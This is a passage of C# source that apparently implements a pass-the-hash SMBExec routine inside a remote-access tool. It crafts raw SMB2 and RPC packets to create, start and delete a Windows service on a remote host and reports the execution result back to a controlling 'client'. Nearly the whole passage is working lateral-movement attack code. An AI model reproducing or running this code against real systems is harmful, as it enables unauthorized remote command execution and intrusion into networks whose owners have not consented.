                                                SMBExec_failed = true;
                                            }

                                        }
                                        break;

                                    case "CreateServiceW":
                                        {
                                            if (SMBExec_command.Length < SMB_split_index)
                                            {
                                                SMB2_message_ID += 20;
                                                packet_SMB2_header = PTHSMBExecHelper.GetPacketSMB2Header(new byte[] { 0x09, 0x00 }, SMB2_message_ID, SMB2_tree_ID, SMB_session_ID);
                                                packet_SMB2_header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                                if (SMB_signing)
                                                {
                                                    packet_SMB2_header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                                }
                                                OrderedDictionary packet_RPC_data = PTHSMBExecHelper.GetPacketRPCRequest(new byte[] { 0x03 }, SCM_data.Length, 0, 0, new byte[] { 0x01, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x0c, 0x00 }, null);
                                                byte[] RPC_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_RPC_data);
                                                OrderedDictionary packet_SMB_data = PTHSMBExecHelper.GetPacketSMB2WriteRequest(SMB_file_ID, RPC_data.Length + SCM_data.Length);
                                                byte[] SMB2_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB_data);
                                                byte[] SMB2_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                                int RPC_data_Length = SMB2_data.Length + SCM_data.Length + RPC_data.Length;
                                                OrderedDictionary packet_NetBIOS_session_service = PTHSMBExecHelper.GetPacketNetBIOSSessionService(SMB2_header.Length, RPC_data_Length);
                                                byte[] NetBIOS_session_service = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                                                if (SMB_signing)
                                                {
                                                    HMACSHA256 HMAC_SHA256 = new HMACSHA256();
                                                    byte[] SMB2_Sign = PTHSMBExecHelper.CombineByteArray(SMB2_header, SMB2_data);
                                                    SMB2_Sign = PTHSMBExecHelper.CombineByteArray(SMB2_Sign, RPC_data);
                                                    SMB2_Sign = PTHSMBExecHelper.CombineByteArray(SMB2_Sign, SCM_data);
                                                    byte[] SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                                    SMB2_Signature = PTHSMBExecHelper.getByteRange(SMB2_Signature, 0, 15);
                                                    packet_SMB2_header["SMB2Header_Signature"] = SMB2_Signature;
                                                    SMB2_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                                }
                                                SMB_client_send = PTHSMBExecHelper.CombineByteArray(NetBIOS_session_service, SMB2_header);
                                                SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, SMB2_data);
                                                SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, RPC_data);
                                                SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, SCM_data);
                                                SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                                SMBClientStream.Flush();
                                                SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                                SMBClientStage = "ReadRequest";
                                                SMB_client_stage_next = "StartServiceW";

                                            }
                                            else
                                            {
                                                //nothing here.
                                            }
                                        }
                                        break;
                                    case "CreateServiceW_First":
                                        {
                                            SMB_split_stage_final = Math.Ceiling((double)SCM_data.Length / SMB_split_index);
                                            SMB2_message_ID += 20;
                                            packet_SMB2_header = PTHSMBExecHelper.GetPacketSMB2Header(new byte[] { 0x09, 0x00 }, SMB2_message_ID, SMB2_tree_ID, SMB_session_ID);
                                            packet_SMB2_header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                            if (SMB_signing)
                                            {
                                                packet_SMB2_header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                            }

                                            byte[] SCM_data_first = PTHSMBExecHelper.getByteRange(SCM_data, 0, SMB_split_index - 1);
                                            OrderedDictionary packet_RPC_data = PTHSMBExecHelper.GetPacketRPCRequest(new byte[] { 0x01 }, 0, 0, 0, new byte[] { 0x01, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x0c, 0x00 }, SCM_data_first);
                                            packet_RPC_data["RPCRequest_AllocHint"] = BitConverter.GetBytes(SCM_data.Length);
                                            SMB_split_index_tracker = SMB_split_index;
                                            byte[] RPC_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_RPC_data);
                                            OrderedDictionary packet_SMB2_data = PTHSMBExecHelper.GetPacketSMB2WriteRequest(SMB_file_ID, RPC_data.Length);
                                            byte[] SMB2_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            byte[] SMB2_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB2_data);
                                            int RPC_data_length = SMB2_data.Length + RPC_data.Length;
                                            OrderedDictionary packet_netBIOS_session_service = PTHSMBExecHelper.GetPacketNetBIOSSessionService(SMB2_header.Length, RPC_data_length);
                                            byte[] NetBIOS_session_service = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_netBIOS_session_service);
                                            if (SMB_signing)
                                            {
                                                HMACSHA256 HMAC_SHA256 = new HMACSHA256();
                                                byte[] SMB2_Sign = PTHSMBExecHelper.CombineByteArray(SMB2_header, SMB2_data);
                                                SMB2_Sign = PTHSMBExecHelper.CombineByteArray(SMB2_Sign, RPC_data);
                                                byte[] SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                                SMB2_Signature = PTHSMBExecHelper.getByteRange(SMB2_Signature, 0, 15);
                                                packet_SMB2_header["SMB2Header_Signature"] = SMB2_Signature;
                                                SMB2_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            }
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(NetBIOS_session_service, SMB2_header);
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, SMB2_data);
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, RPC_data);
                                            SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                            SMBClientStream.Flush();
                                            SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);

                                            if (SMB_split_stage_final <= 2)
                                            {
                                                SMBClientStage = "CreateServiceW_Last";
                                            }
                                            else
                                            {
                                                SMB_split_stage = 2;
                                                SMBClientStage = "CreateServiceW_Middle";
                                            }
                                        }
                                        break;

                                    case "CreateServiceW_Middle":
                                        {
                                            SMB_split_stage++;
                                            SMB2_message_ID++;
                                            packet_SMB2_header = PTHSMBExecHelper.GetPacketSMB2Header(new byte[] { 0x09, 0x00 }, SMB2_message_ID, SMB2_tree_ID, SMB_session_ID);
                                            packet_SMB2_header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                            if (SMB_signing)
                                            {
                                                packet_SMB2_header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                            }

                                            byte[] SCM_data_middle = PTHSMBExecHelper.getByteRange(SCM_data, SMB_split_index_tracker, SMB_split_index - 1);
                                            OrderedDictionary packet_RPC_data = PTHSMBExecHelper.GetPacketRPCRequest(new byte[] { 0x00 }, 0, 0, 0, new byte[] { 0x01, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x0c, 0x00 }, SCM_data_middle);
                                            packet_RPC_data["RPCRequest_AllocHint"] = BitConverter.GetBytes(SCM_data.Length - SMB_split_index_tracker + SMB_split_index);
                                            SMB_split_index_tracker += SMB_split_index;
                                            byte[] RPC_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_RPC_data);
                                            OrderedDictionary packet_SMB2_data = PTHSMBExecHelper.GetPacketSMB2WriteRequest(SMB_file_ID, RPC_data.Length);
                                            byte[] SMB2_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            byte[] SMB2_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB2_data);
                                            int RPC_data_length = SMB2_data.Length + RPC_data.Length;
                                            OrderedDictionary packet_netBIOS_session_service = PTHSMBExecHelper.GetPacketNetBIOSSessionService(SMB2_header.Length, RPC_data_length);
                                            byte[] NetBIOS_session_service = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_netBIOS_session_service);
                                            if (SMB_signing)
                                            {
                                                HMACSHA256 HMAC_SHA256 = new HMACSHA256();
                                                byte[] SMB2_Sign = PTHSMBExecHelper.CombineByteArray(SMB2_header, SMB2_data);
                                                SMB2_Sign = PTHSMBExecHelper.CombineByteArray(SMB2_Sign, RPC_data);
                                                byte[] SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                                SMB2_Signature = PTHSMBExecHelper.getByteRange(SMB2_Signature, 0, 15);
                                                packet_SMB2_header["SMB2Header_Signature"] = SMB2_Signature;
                                                SMB2_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            }
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(NetBIOS_session_service, SMB2_header);
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, SMB2_data);
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, RPC_data);
                                            SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                            SMBClientStream.Flush();
                                            SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);

                                            if (SMB_split_stage >= SMB_split_stage_final)
                                            {
                                                SMBClientStage = "CreateServiceW_Last";
                                            }
                                            else
                                            {
                                                SMBClientStage = "CreateServiceW_Middle";
                                            }
                                        }
                                        break;

                                    case "CreateServiceW_Last":
                                        {
                                            SMB2_message_ID++;
                                            packet_SMB2_header = PTHSMBExecHelper.GetPacketSMB2Header(new byte[] { 0x09, 0x00 }, SMB2_message_ID, SMB2_tree_ID, SMB_session_ID);
                                            packet_SMB2_header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                            if (SMB_signing)
                                            {
                                                packet_SMB2_header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                            }
                                            byte[] SCM_data_last = PTHSMBExecHelper.getByteRange(SCM_data, SMB_split_index_tracker, SCM_data.Length);
                                            OrderedDictionary packet_RPC_data = PTHSMBExecHelper.GetPacketRPCRequest(new byte[] { 0x02 }, 0, 0, 0, new byte[] { 0x01, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x0c, 0x00 }, SCM_data_last);
                                            byte[] RPC_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_RPC_data);
                                            OrderedDictionary packet_SMB2_data = PTHSMBExecHelper.GetPacketSMB2WriteRequest(SMB_file_ID, RPC_data.Length);
                                            byte[] SMB2_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            byte[] SMB2_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB2_data);
                                            int RPC_data_length = SMB2_data.Length + RPC_data.Length;
                                            OrderedDictionary packet_netBIOS_session_service = PTHSMBExecHelper.GetPacketNetBIOSSessionService(SMB2_header.Length, RPC_data_length);
                                            byte[] NetBIOS_session_service = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_netBIOS_session_service);
                                            if (SMB_signing)
                                            {
                                                HMACSHA256 HMAC_SHA256 = new HMACSHA256();
                                                byte[] SMB2_Sign = PTHSMBExecHelper.CombineByteArray(SMB2_header, SMB2_data);
                                                SMB2_Sign = PTHSMBExecHelper.CombineByteArray(SMB2_Sign, RPC_data);
                                                byte[] SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                                SMB2_Signature = PTHSMBExecHelper.getByteRange(SMB2_Signature, 0, 15);
                                                packet_SMB2_header["SMB2Header_Signature"] = SMB2_Signature;
                                                SMB2_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            }
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(NetBIOS_session_service, SMB2_header);
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, SMB2_data);
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, RPC_data);
                                            SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                            SMBClientStream.Flush();
                                            SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                        }
                                        break;

                                    case "StartServiceW":
                                        {
                                            if (BitConverter.ToString(PTHSMBExecHelper.getByteRange(SMBClientReceive, 132, 135)) == "00-00-00-00")
                                            {
                                                SMB_service_context_handle = PTHSMBExecHelper.getByteRange(SMBClientReceive, 112, 131);
                                                SMB2_message_ID += 20;
                                                packet_SMB2_header = PTHSMBExecHelper.GetPacketSMB2Header(new byte[] { 0x09, 0x00 }, SMB2_message_ID, SMB2_tree_ID, SMB_session_ID);
                                                packet_SMB2_header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                                if (SMB_signing)
                                                {
                                                    packet_SMB2_header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                                }
                                                OrderedDictionary packet_SCM_data = PTHSMBExecHelper.GetPacketSCMStartServiceW(SMB_service_context_handle);
                                                SCM_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SCM_data);
                                                OrderedDictionary packet_RPC_data = PTHSMBExecHelper.GetPacketRPCRequest(new byte[] { 0x03 }, SCM_data.Length, 0, 0, new byte[] { 0x01, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x13, 0x00 }, null);
                                                byte[] RPC_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_RPC_data);
                                                OrderedDictionary packet_SMB2_data = PTHSMBExecHelper.GetPacketSMB2WriteRequest(SMB_file_ID, RPC_data.Length + SCM_data.Length);
                                                byte[] SMB2_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                                byte[] SMB2_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB2_data);
                                                int RPC_data_length = SMB2_data.Length + SCM_data.Length + RPC_data.Length;
                                                OrderedDictionary packet_netBIOS_session_service = PTHSMBExecHelper.GetPacketNetBIOSSessionService(SMB2_header.Length, RPC_data_length);
                                                byte[] NetBIOS_session_service = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_netBIOS_session_service);
                                                if (SMB_signing)
                                                {
                                                    HMACSHA256 HMAC_SHA256 = new HMACSHA256();
                                                    byte[] SMB2_Sign = PTHSMBExecHelper.CombineByteArray(SMB2_header, SMB2_data);
                                                    SMB2_Sign = PTHSMBExecHelper.CombineByteArray(SMB2_Sign, RPC_data);
                                                    SMB2_Sign = PTHSMBExecHelper.CombineByteArray(SMB2_Sign, SCM_data);
                                                    byte[] SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                                    SMB2_Signature = PTHSMBExecHelper.getByteRange(SMB2_Signature, 0, 15);
                                                    packet_SMB2_header["SMB2Header_Signature"] = SMB2_Signature;
                                                    SMB2_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                                }
                                                SMB_client_send = PTHSMBExecHelper.CombineByteArray(NetBIOS_session_service, SMB2_header);
                                                SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, SMB2_data);
                                                SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, RPC_data);
                                                SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, SCM_data);
                                                SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                                SMBClientStream.Flush();
                                                SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                                SMBClientStage = "ReadRequest";
                                                SMB_client_stage_next = "DeleteServiceW";
                                            }
                                            else if (BitConverter.ToString(PTHSMBExecHelper.getByteRange(SMBClientReceive, 132, 135)) == "31-04-00-00")
                                            {
                                                new Packets.ClientPackets.DoSMBExecResponse("Execution Failed: Service Creation Failed", false).Execute(client);
                                                SMBExec_failed = true;
                                            }
                                            else
                                            {
                                                new Packets.ClientPackets.DoSMBExecResponse("Execution Failed: Context Mismatch", false).Execute(client);
                                                SMBExec_failed = true;
                                            }
                                        }
                                        break;

                                    case "DeleteServiceW":
                                        {
                                            if (BitConverter.ToString(PTHSMBExecHelper.getByteRange(SMBClientReceive, 108, 111)) == "1d-04-00-00")
                                            {
                                                new Packets.ClientPackets.DoSMBExecResponse("Execution Success: Process Started", true).Execute(client);
                                            }
                                            else if (BitConverter.ToString(PTHSMBExecHelper.getByteRange(SMBClientReceive, 108, 11)) == "02-00-00-00")
                                            {
                                                new Packets.ClientPackets.DoSMBExecResponse("Execution Failed: Process did not start", false).Execute(client);
                                            }

                                            SMB2_message_ID += 20;
                                            packet_SMB2_header = PTHSMBExecHelper.GetPacketSMB2Header(new byte[] { 0x09, 0x00 }, SMB2_message_ID, SMB2_tree_ID, SMB_session_ID);
                                            packet_SMB2_header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                            if (SMB_signing)
                                            {
                                                packet_SMB2_header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                            }

                                            OrderedDictionary packet_SCM_data = PTHSMBExecHelper.GetPacketSCMDeleteServiceW(SMB_service_context_handle);
                                            SCM_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SCM_data);
                                            OrderedDictionary packet_RPC_data = PTHSMBExecHelper.GetPacketRPCRequest(new byte[] { 0x03 }, SCM_data.Length, 0, 0, new byte[] { 0x01, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x02, 0x00 }, null);
                                            byte[] RPC_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_RPC_data);
                                            OrderedDictionary packet_SMB2_data = PTHSMBExecHelper.GetPacketSMB2WriteRequest(SMB_file_ID, RPC_data.Length + SCM_data.Length);
                                            byte[] SMB2_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            byte[] SMB2_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB2_data);
                                            int RPC_data_length = SMB2_data.Length + SCM_data.Length + RPC_data.Length;
                                            OrderedDictionary packet_netBIOS_session_service = PTHSMBExecHelper.GetPacketNetBIOSSessionService(SMB2_header.Length, RPC_data_length);
                                            byte[] NetBIOS_session_service = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_netBIOS_session_service);
                                            if (SMB_signing)
                                            {
                                                HMACSHA256 HMAC_SHA256 = new HMACSHA256();
                                                byte[] SMB2_Sign = PTHSMBExecHelper.CombineByteArray(SMB2_header, SMB2_data);
                                                SMB2_Sign = PTHSMBExecHelper.CombineByteArray(SMB2_Sign, RPC_data);
                                                SMB2_Sign = PTHSMBExecHelper.CombineByteArray(SMB2_Sign, SCM_data);
                                                byte[] SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                                SMB2_Signature = PTHSMBExecHelper.getByteRange(SMB2_Signature, 0, 15);
                                                packet_SMB2_header["SMB2Header_Signature"] = SMB2_Signature;
                                                SMB2_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            }
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(NetBIOS_session_service, SMB2_header);
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, SMB2_data);
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, RPC_data);
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, SCM_data);
                                            SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                            SMBClientStream.Flush();
                                            SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                            SMBClientStage = "ReadRequest";
                                            SMB_client_stage_next = "CloseServiceHandle";
                                            SMB_close_service_handle_stage = 1;
                                        }
                                        break;

                                    case "CloseServiceHandle":
                                        {
                                            OrderedDictionary packet_SCM_data;
                                            if (SMB_close_service_handle_stage == 1)
                                            {
                                                SMB2_message_ID += 20;
                                                SMB_close_service_handle_stage++;
                                                packet_SCM_data = PTHSMBExecHelper.GetPacketSCMCloseServiceHandle(SMB_service_context_handle);
                                            }
                                            else
                                            {
                                                SMB2_message_ID++;
                                                SMBClientStage = "CloseRequest";
                                                packet_SCM_data = PTHSMBExecHelper.GetPacketSCMCloseServiceHandle(SMB_service_manager_context_handle);
                                            }
                                            if (SMB_signing)
                                            {
                                                packet_SMB2_header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                            }

                                            packet_SMB2_header = PTHSMBExecHelper.GetPacketSMB2Header(new byte[] { 0x09, 0x00 }, SMB2_message_ID, SMB2_tree_ID, SMB_session_ID);
                                            packet_SMB2_header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                            SCM_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SCM_data);
                                            OrderedDictionary packet_RPC_data = PTHSMBExecHelper.GetPacketRPCRequest(new byte[] { 0x03 }, SCM_data.Length, 0, 0, new byte[] { 0x01, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x02, 0x00 }, null);
                                            byte[] RPC_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_RPC_data);
                                            OrderedDictionary packet_SMB2_data = PTHSMBExecHelper.GetPacketSMB2WriteRequest(SMB_file_ID, RPC_data.Length + SCM_data.Length);
                                            byte[] SMB2_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            byte[] SMB2_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB2_data);
                                            int RPC_data_length = SMB2_data.Length + SCM_data.Length + RPC_data.Length;
                                            OrderedDictionary packet_netBIOS_session_service = PTHSMBExecHelper.GetPacketNetBIOSSessionService(SMB2_header.Length, RPC_data_length);
                                            byte[] NetBIOS_session_service = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_netBIOS_session_service);
                                            if (SMB_signing)
                                            {
                                                HMACSHA256 HMAC_SHA256 = new HMACSHA256();
                                                byte[] SMB2_Sign = PTHSMBExecHelper.CombineByteArray(SMB2_header, SMB2_data);
                                                SMB2_Sign = PTHSMBExecHelper.CombineByteArray(SMB2_Sign, RPC_data);
                                                SMB2_Sign = PTHSMBExecHelper.CombineByteArray(SMB2_Sign, SCM_data);
                                                byte[] SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                                SMB2_Signature = PTHSMBExecHelper.getByteRange(SMB2_Signature, 0, 15);
                                                packet_SMB2_header["SMB2Header_Signature"] = SMB2_Signature;
                                                SMB2_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            }
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(NetBIOS_session_service, SMB2_header);
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, SMB2_data);
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, RPC_data);
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, SCM_data);
                                            SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                            SMBClientStream.Flush();
                                            SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);

                                        }
                                        break;
                                    case "CloseRequest":
                                        {
                                            SMB2_message_ID += 20;
                                            packet_SMB2_header = PTHSMBExecHelper.GetPacketSMB2Header(new byte[] { 0x06, 0x00 }, SMB2_message_ID, SMB2_tree_ID, SMB_session_ID);
                                            packet_SMB2_header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                            if (SMB_signing)
                                            {
                                                packet_SMB2_header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                            }

                                            OrderedDictionary packet_SMB2_data = PTHSMBExecHelper.GetPacketSMB2CloseRequest(SMB_file_ID);
                                            byte[] SMB2_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            byte[] SMB2_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB2_data);
                                            OrderedDictionary packet_netBIOS_session_service = PTHSMBExecHelper.GetPacketNetBIOSSessionService(SMB2_header.Length, SMB2_data.Length);
                                            byte[] NetBIOS_session_service = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_netBIOS_session_service);
                                            if (SMB_signing)
                                            {
                                                HMACSHA256 HMAC_SHA256 = new HMACSHA256();
                                                byte[] SMB2_Sign = PTHSMBExecHelper.CombineByteArray(SMB2_header, SMB2_data);
                                                byte[] SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                                SMB2_Signature = PTHSMBExecHelper.getByteRange(SMB2_Signature, 0, 15);
                                                packet_SMB2_header["SMB2Header_Signature"] = SMB2_Signature;
                                                SMB2_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            }
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(NetBIOS_session_service, SMB2_header);
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, SMB2_data);
                                            SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                            SMBClientStream.Flush();
                                            SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                            SMBClientStage = "TreeDisconnect";
                                        }
                                        break;

                                    case "TreeDisconnect":
                                        {
                                            SMB2_message_ID++;
                                            packet_SMB2_header = PTHSMBExecHelper.GetPacketSMB2Header(new byte[] { 0x04, 0x00 }, SMB2_message_ID, SMB2_tree_ID, SMB_session_ID);
                                            packet_SMB2_header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                            if (SMB_signing)
                                            {
                                                packet_SMB2_header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                            }
                                            OrderedDictionary packet_SMB2_data = PTHSMBExecHelper.GetPacketSMB2TreeDisconnectRequest();
                                            byte[] SMB2_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            byte[] SMB2_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB2_data);
                                            OrderedDictionary packet_netBIOS_session_service = PTHSMBExecHelper.GetPacketNetBIOSSessionService(SMB2_header.Length, SMB2_data.Length);
                                            byte[] NetBIOS_session_service = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_netBIOS_session_service);
                                            if (SMB_signing)
                                            {
                                                HMACSHA256 HMAC_SHA256 = new HMACSHA256();
                                                byte[] SMB2_Sign = PTHSMBExecHelper.CombineByteArray(SMB2_header, SMB2_data);
                                                byte[] SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                                SMB2_Signature = PTHSMBExecHelper.getByteRange(SMB2_Signature, 0, 15);
                                                packet_SMB2_header["SMB2Header_Signature"] = SMB2_Signature;
                                                SMB2_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            }
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(NetBIOS_session_service, SMB2_header);
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, SMB2_data);
                                            SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                            SMBClientStream.Flush();
                                            SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                            SMBClientStage = "Logoff";
                                        }
                                        break;
                                    case "Logoff":
                                        {
                                            SMB2_message_ID += 20;
                                            packet_SMB2_header = PTHSMBExecHelper.GetPacketSMB2Header(new byte[] { 0x02, 0x00 }, SMB2_message_ID, SMB2_tree_ID, SMB_session_ID);
                                            packet_SMB2_header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                            if (SMB_signing)
                                            {
                                                packet_SMB2_header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                            }
                                            OrderedDictionary packet_SMB2_data = PTHSMBExecHelper.GetPacketSMB2SessionLogoffRequest();
                                            byte[] SMB2_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            byte[] SMB2_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB2_data);
                                            OrderedDictionary packet_netBIOS_session_service = PTHSMBExecHelper.GetPacketNetBIOSSessionService(SMB2_header.Length, SMB2_data.Length);
                                            byte[] NetBIOS_session_service = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_netBIOS_session_service);
                                            if (SMB_signing)
                                            {
                                                HMACSHA256 HMAC_SHA256 = new HMACSHA256();
                                                byte[] SMB2_Sign = PTHSMBExecHelper.CombineByteArray(SMB2_header, SMB2_data);
                                                byte[] SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                                SMB2_Signature = PTHSMBExecHelper.getByteRange(SMB2_Signature, 0, 15);
                                                packet_SMB2_header["SMB2Header_Signature"] = SMB2_Signature;
                                                SMB2_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            }
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(NetBIOS_session_service, SMB2_header);
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, SMB2_data);
                                            SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                            SMBClientStream.Flush();
